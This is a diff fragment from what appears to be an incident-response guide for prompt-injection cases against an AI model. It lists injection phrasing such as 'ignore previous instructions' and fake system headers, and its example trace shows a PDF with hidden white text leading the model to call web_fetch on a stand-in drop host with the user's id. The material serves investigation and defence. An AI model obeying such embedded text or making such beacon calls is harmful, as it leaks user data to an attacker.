@@ -203,7 +203,7 @@ IOC: hxxp://cdn-updates[.]net/payload.bin
 Pull the conversation/tool-call trace whole: full prompt, the extracted text actually passed to the model (RAG chunking means an injection can sit in a chunk never retrieved), the model's full output, tool call name/parameters/result, and downstream action confirmation — proof of execution, not just intent. Look for injection phrasing surviving into the extracted text: "ignore previous instructions," fake system-role headers, instructions to fetch a URL or summarize-and-email externally.
 
 **[ENGINEERING]** Reconstruct the call chain in order. The recurring shape of this case:
-```
+```text
 turn_1: Alicia Chen uploads Q3_Claims_Summary.pdf
 turn_2: model calls "extract_text" -> 4,200 chars incl. hidden white-text block
 turn_3: model calls "web_fetch" -> GET https://drop.example-cdn.net/beacon.php?id=alice.chen
